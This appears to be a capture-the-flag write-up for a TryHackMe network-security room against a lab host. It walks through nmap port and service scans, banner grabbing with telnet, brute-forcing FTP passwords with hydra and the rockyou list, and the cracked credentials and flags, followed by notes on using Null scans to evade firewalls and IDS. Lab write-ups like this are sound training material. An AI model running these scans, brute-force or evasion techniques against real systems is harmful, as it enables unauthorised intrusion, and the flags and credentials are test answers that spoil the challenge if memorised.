@@ -1,0 +1,284 @@
+
+What is the highest port number being open less than 10,000?
+```
+root@ip-10-10-153-80:~# nmap -T4 -p1-10000 -v --open 10.10.216.66  !!!
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-04 13:55 BST
+Initiating ARP Ping Scan at 13:55
+Scanning 10.10.216.66 [1 port]
+Completed ARP Ping Scan at 13:55, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 13:55
+Completed Parallel DNS resolution of 1 host. at 13:55, 0.00s elapsed
+Initiating SYN Stealth Scan at 13:55
+Scanning ip-10-10-216-66.eu-west-1.compute.internal (10.10.216.66) [10000 ports]
+Discovered open port 22/tcp on 10.10.216.66
+Discovered open port 80/tcp on 10.10.216.66
+Discovered open port 8080/tcp on 10.10.216.66
+Discovered open port 139/tcp on 10.10.216.66
+Discovered open port 445/tcp on 10.10.216.66
+Completed SYN Stealth Scan at 13:55, 10.83s elapsed (10000 total ports)
+Nmap scan report for ip-10-10-216-66.eu-west-1.compute.internal (10.10.216.66)
+Host is up (0.00061s latency).
+Not shown: 9995 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+8080/tcp open  http-proxy                 !!!
+MAC Address: 02:A8:58:77:DE:AB (Unknown)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds
+           Raw packets sent: 16595 (730.164KB) | Rcvd: 16595 (663.812KB)
+
+```
+
+There is an open port outside the common 1000 ports; it is above 10,000. What is it?
+```
+root@ip-10-10-153-80:~# nmap -T4 -p1-20000 -v --open 10.10.216.66   !!!
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-04 14:05 BST
+Initiating ARP Ping Scan at 14:05
+Scanning 10.10.216.66 [1 port]
+Completed ARP Ping Scan at 14:05, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 14:05
+Completed Parallel DNS resolution of 1 host. at 14:05, 0.00s elapsed
+Initiating SYN Stealth Scan at 14:05
+Scanning ip-10-10-216-66.eu-west-1.compute.internal (10.10.216.66) [20000 ports]
+Discovered open port 445/tcp on 10.10.216.66
+Discovered open port 139/tcp on 10.10.216.66
+Discovered open port 22/tcp on 10.10.216.66
+Discovered open port 80/tcp on 10.10.216.66
+Discovered open port 8080/tcp on 10.10.216.66
+Discovered open port 10021/tcp on 10.10.216.66
+Completed SYN Stealth Scan at 14:05, 17.15s elapsed (20000 total ports)
+Nmap scan report for ip-10-10-216-66.eu-west-1.compute.internal (10.10.216.66)
+Host is up (0.00071s latency).
+Not shown: 19994 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+8080/tcp  open  http-proxy
+10021/tcp open  unknown    !!!
+MAC Address: 02:A8:58:77:DE:AB (Unknown)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 17.52 seconds
+           Raw packets sent: 35608 (1.567MB) | Rcvd: 35608 (1.424MB)
+
+```
+
+
+What is the flag hidden in the HTTP server header?
+```
+root@ip-10-10-153-80:~# telnet 10.10.216.66 80  !!!
+Trying 10.10.216.66...
+Connected to 10.10.216.66.
+Escape character is '^]'.
+GET /index.html HTTP/1.1   !!!
+host: telent    !!!
+
+HTTP/1.1 200 OK
+Vary: Accept-Encoding
+Content-Type: text/html
+Accept-Ranges: bytes
+ETag: "229449419"
+Last-Modified: Tue, 14 Sep 2021 07:33:09 GMT
+Content-Length: 226
+Date: Sun, 04 Aug 2024 13:07:30 GMT
+Server: lighttpd THM{web_server_25352}   !!!
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Hello, world!</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+</head>
+<body>
+  <h1>Hello, world!</h1>
+</body>
+</html>
+Connection closed by foreign host.
+```
+
+What is the flag hidden in the SSH server header?
+```
+root@ip-10-10-153-80:~# telnet 10.10.216.66 22    !!!
+Trying 10.10.216.66...
+Connected to 10.10.216.66.
+Escape character is '^]'.
+SSH-2.0-OpenSSH_8.2p1 THM{946219583339}    !!!
+
+```
+
+We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
+```
+oot@ip-10-10-153-80:~# nmap -p10021 -sV -v 10.10.216.66   !!!
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-04 14:10 BST
+NSE: Loaded 42 scripts for scanning.
+Initiating ARP Ping Scan at 14:10
+Scanning 10.10.216.66 [1 port]
+Completed ARP Ping Scan at 14:10, 0.23s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 14:10
+Completed Parallel DNS resolution of 1 host. at 14:10, 0.00s elapsed
+Initiating SYN Stealth Scan at 14:10
+Scanning ip-10-10-216-66.eu-west-1.compute.internal (10.10.216.66) [1 port]
+Discovered open port 10021/tcp on 10.10.216.66
+Completed SYN Stealth Scan at 14:10, 0.22s elapsed (1 total ports)
+Initiating Service scan at 14:10
+Scanning 1 service on ip-10-10-216-66.eu-west-1.compute.internal (10.10.216.66)
+Completed Service scan at 14:10, 0.01s elapsed (1 service on 1 host)
+NSE: Script scanning 10.10.216.66.
+Initiating NSE at 14:10
+Completed NSE at 14:10, 0.00s elapsed
+Initiating NSE at 14:10
+Completed NSE at 14:10, 0.00s elapsed
+Nmap scan report for ip-10-10-216-66.eu-west-1.compute.internal (10.10.216.66)
+Host is up (0.00015s latency).
+
+PORT      STATE SERVICE VERSION
+10021/tcp open  ftp     vsftpd 3.0.3   !!!
+MAC Address: 02:A8:58:77:DE:AB (Unknown)
+Service Info: OS: Unix
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
+           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
+
+```
+
+We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?
+```
+root@ip-10-10-153-80:~# hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.10.216.66:10021   !!!
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2024-08-04 14:45:04
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ftp://10.10.216.66:10021/
+[10021][ftp] host: 10.10.216.66   login: quinn   password: andrea   !!!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2024-08-04 14:45:17
+
+root@ip-10-10-153-80:~# hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.216.66:10021   !!!
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2024-08-04 14:45:53
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ftp://10.10.216.66:10021/
+[10021][ftp] host: 10.10.216.66   login: eddie   password: jordan  !!!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2024-08-04 14:46:06
+
+
+root@ip-10-10-153-80:~# ftp 10.10.216.66 10021  !!!
+Connected to 10.10.216.66.
+220 (vsFTPd 3.0.3)
+Name (10.10.216.66:root): quinn   !!!
+331 Please specify the password.
+Password:                         !!!
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls                           !!!
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt   !!!
+226 Directory send OK.
+ftp> ascii                   !!!
+200 Switching to ASCII mode.
+ftp> get ftp_flag.txt        !!!
+local: ftp_flag.txt remote: ftp_flag.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
+WARNING! 1 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Transfer complete.
+18 bytes received in 0.00 secs (7.2189 kB/s)
+ftp> ^Z
+[5]+  Stopped                 ftp 10.10.216.66 10021
+root@ip-10-10-153-80:~# ls
+burp.json  CTFBuilder  Desktop  Downloads  ftp_flag.txt  Instructions  Pictures  Postman  Rooms  Scripts  thinclient_drives  Tools
+root@ip-10-10-153-80:~# cat ftp_flag.txt   !!!
+THM{321452667098}   !!!
+
+```
+
+Browsing to `http://10.10.216.66:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?
+```
+root@ip-10-10-153-80:~# nmap -sN 10.10.216.66
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-04 15:07 BST
+Nmap scan report for ip-10-10-216-66.eu-west-1.compute.internal (10.10.216.66)
+Host is up (0.00050s latency).
+Not shown: 995 closed ports
+PORT     STATE         SERVICE
+22/tcp   open|filtered ssh
+80/tcp   open|filtered http
+139/tcp  open|filtered netbios-ssn
+445/tcp  open|filtered microsoft-ds
+8080/tcp open|filtered http-proxy
+MAC Address: 02:A8:58:77:DE:AB (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 95.91 seconds
+
+```
+
+### TCP SYN Scan (`-sS`)
+
+#### How It Works:
+1. **SYN Packet Sent:** Nmap sends a SYN packet (like a normal TCP connection initiation).
+2. **Response Interpretation:**
+    - **SYN/ACK:** If the target port is open, the target responds with a SYN/ACK packet.
+    - **RST:** If the port is closed, the target responds with a RST packet.
+    - **No Response or ICMP Message:** Indicates the port is filtered by a firewall.
+3. **Connection Reset:** Upon receiving a SYN/ACK, Nmap immediately sends a RST packet to terminate the connection, avoiding the completion of the TCP handshake. This makes the scan less conspicuous because a full connection is never established.
+
+#### Advantages:
+- **Speed:** Faster than a full TCP connect scan (`-sT`).
+- **Stealth:** Less likely to be logged because a full connection is not established.
+
+#### Detection:
+- **Firewalls/IDS/IPS:** Many firewalls, intrusion detection systems (IDS), and intrusion prevention systems (IPS) are configured to detect SYN scans. The characteristic SYN packets without subsequent data packets can trigger alerts.
+- **Logs:** Even though a full TCP connection isn't established, many security systems log the initial SYN packet, especially when it's followed by a RST packet shortly after.
+
+### TCP Null Scan (`-sN`)
+#### How It Works:
+1. **Null Packet Sent:** Nmap sends a TCP packet with no flags set.
+2. **Response Interpretation:**
+    - **No Response:** Indicates the port is open.
+    - **RST:** Indicates the port is closed.
+    - **ICMP Messages or Other Responses:** Can indicate filtering by a firewall.
+
+#### Advantages
+- **Evasion:** Null scans can bypass some firewalls and IDS/IPS that are not configured to recognize them, as they don't follow standard connection patterns.
+- **Fingerprinting:** Useful for identifying certain types of operating systems based on how they handle unexpected packets.
+
+#### Detection:
+- **Less Common:** Since Null scans are less common and do not follow the typical patterns of TCP connections, they might not trigger IDS/IPS systems that are tuned to detect SYN or other typical scan types.
+- **Log Analysis:** More sophisticated security systems might still detect and log these packets, especially if they notice unusual traffic patterns or a high volume of Null packets.
+
+### Why `-sS` Might Be Detected While `-sN` Might Not
+1. **Typical Traffic Patterns:**
+    
+    - **SYN Scan (`-sS`):** Follows the initial pattern of a normal TCP handshake (SYN packet), which is common and therefore often scrutinized by security systems.
+    - **Null Scan (`-sN`):** Sends packets with no flags, which do not follow any typical communication pattern and might not be recognized by less sophisticated systems.
+2. **Firewall/IDS/IPS Configuration:**
+    
+    - **SYN Scan Detection:** Many systems are configured to detect multiple SYN packets from a single source, especially when they are followed by a RST packet, as this is a hallmark of a SYN scan.
+    - **Null Scan Evasion:** Some firewalls and IDS/IPS might not be configured to detect Null scans because they are less common and do not follow standard TCP connection procedures.
+3. **Logging and Alerts:**
+    
+    - **SYN Scans:** More likely to be logged due to the nature of the packets and their typical detection by security systems.
+    - **Null Scans:** Might evade detection if the security systems are not configured to recognize or log such traffic.
+
+### Summary
+- **SYN Scan (`-sS`):** Fast and effective but more likely to be detected by firewalls, IDS, and IPS due to its recognizable pattern of SYN packets followed by RST packets.
+- **Null Scan (`-sN`):** Less common and may bypass some security systems because it does not follow standard TCP communication patterns, making it less likely to be detected.
+
+When choosing between the two, consider the target environment's security measures and the specific goals of your scan. For stealthier reconnaissance, a Null scan might be preferable, whereas a SYN scan is useful for its speed and efficiency but comes with a higher risk of detection.
